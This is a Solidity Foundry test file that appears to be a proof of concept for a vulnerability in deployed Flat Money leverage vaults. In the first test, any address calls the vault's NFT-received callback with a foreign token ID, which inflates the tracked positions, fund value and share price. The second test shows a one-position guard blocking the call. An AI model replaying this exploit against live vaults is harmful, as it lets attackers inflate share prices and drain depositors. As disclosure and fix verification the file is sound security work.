// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma abicoder v2;

import {Test} from "forge-std/Test.sol";

import {PoolFactory} from "contracts/PoolFactory.sol";
import {PoolLogic} from "contracts/PoolLogic.sol";
import {PoolManagerLogic} from "contracts/PoolManagerLogic.sol";
import {Governance} from "contracts/Governance.sol";
import {FlatMoneyDelayedOrderContractGuard} from "contracts/guards/contractGuards/flatMoney/FlatMoneyDelayedOrderContractGuard.sol";
import {FlatMoneyBasisContractGuard} from "contracts/guards/contractGuards/flatMoney/shared/FlatMoneyBasisContractGuard.sol";
import {BaseConfig} from "test/integration/utils/foundry/config/BaseConfig.sol";

contract FlatMoneyLeverageAttackPoCTest is Test {
  address public anyone = makeAddr("anyone");

  address[] public affectedVaults = [BaseConfig.STETHBULL4X, BaseConfig.STETHBULL3X, BaseConfig.STETHBULL2X];

  function setUp() public {
    vm.createSelectFork("base", 34665067);
  }

  function test_unauthorized_access_to_callback_messes_up_vault_accounting() public {
    for (uint256 i = 0; i < affectedVaults.length; i++) {
      uint256[] memory tokenIdsNow = FlatMoneyDelayedOrderContractGuard(
        PoolFactory(BaseConfig.POOL_FACTORY_PROD).getContractGuard(BaseConfig.FLAT_MONEY_V1_DELAYED_ORDER)
      ).getOwnedTokenIds(affectedVaults[i]);

      assertEq(tokenIdsNow.length, 1);

      uint256 totalValueBefore = PoolManagerLogic(PoolLogic(affectedVaults[i]).poolManagerLogic()).totalFundValue();
      uint256 tokenPriceBefore = PoolLogic(affectedVaults[i]).tokenPrice();

      vm.prank(anyone);
      PoolLogic(affectedVaults[i]).onERC721Received({
        operator: BaseConfig.FLAT_MONEY_V1_DELAYED_ORDER,
        from: address(0),
        tokenId: 80, // Can be any random Flat Money NFT ID: here STETHBULL3X tokenId is used
        data: ""
      });

      uint256[] memory tokenIdsAfter = FlatMoneyDelayedOrderContractGuard(
        PoolFactory(BaseConfig.POOL_FACTORY_PROD).getContractGuard(BaseConfig.FLAT_MONEY_V1_DELAYED_ORDER)
      ).getOwnedTokenIds(affectedVaults[i]);

      assertEq(tokenIdsAfter.length, 2); // Now system "tracks" 2 NFTs, while only one is hold by vault in fact

      uint256 totalValueAfter = PoolManagerLogic(PoolLogic(affectedVaults[i]).poolManagerLogic()).totalFundValue();
      uint256 tokenPriceAfter = PoolLogic(affectedVaults[i]).tokenPrice();

      assertGt(totalValueAfter, totalValueBefore); // Total vault value is now artificially inflated
      assertGt(tokenPriceAfter, tokenPriceBefore); // Vault share price is now artificially inflated
    }
  }

  function test_max_positions_change_fixes_issue() public {
    FlatMoneyBasisContractGuard.PoolSetting[]
      memory whitelistedPoolSettings = new FlatMoneyBasisContractGuard.PoolSetting[](3);
    whitelistedPoolSettings[0] = FlatMoneyBasisContractGuard.PoolSetting({
      poolLogic: BaseConfig.STETHBULL4X,
      withdrawalAsset: BaseConfig.rETH
    });
    whitelistedPoolSettings[1] = FlatMoneyBasisContractGuard.PoolSetting({
      poolLogic: BaseConfig.STETHBULL3X,
      withdrawalAsset: BaseConfig.rETH
    });
    whitelistedPoolSettings[2] = FlatMoneyBasisContractGuard.PoolSetting({
      poolLogic: BaseConfig.STETHBULL2X,
      withdrawalAsset: BaseConfig.rETH
    });

    // This guard has positionsLimit = 1
    address guardWithMaxPositionsChangeToOne = address(
      new FlatMoneyDelayedOrderContractGuard(BaseConfig.NFT_TRACKER_PROD, whitelistedPoolSettings)
    );

    address governance = PoolFactory(BaseConfig.POOL_FACTORY_PROD).governanceAddress();
    address owner = PoolFactory(BaseConfig.POOL_FACTORY_PROD).owner();

    vm.prank(owner);
    Governance(governance).setContractGuard(BaseConfig.FLAT_MONEY_V1_DELAYED_ORDER, guardWithMaxPositionsChangeToOne);

    for (uint256 i = 0; i < affectedVaults.length; i++) {
      uint256[] memory tokenIdsNow = FlatMoneyDelayedOrderContractGuard(
        PoolFactory(BaseConfig.POOL_FACTORY_PROD).getContractGuard(BaseConfig.FLAT_MONEY_V1_DELAYED_ORDER)
      ).getOwnedTokenIds(affectedVaults[i]);

      assertEq(tokenIdsNow.length, 1);

      vm.prank(anyone);
      vm.expectRevert("max position reached");
      PoolLogic(affectedVaults[i]).onERC721Received({
        operator: BaseConfig.FLAT_MONEY_V1_DELAYED_ORDER,
        from: address(0),
        tokenId: 80,
        data: ""
      });
    }
  }
}
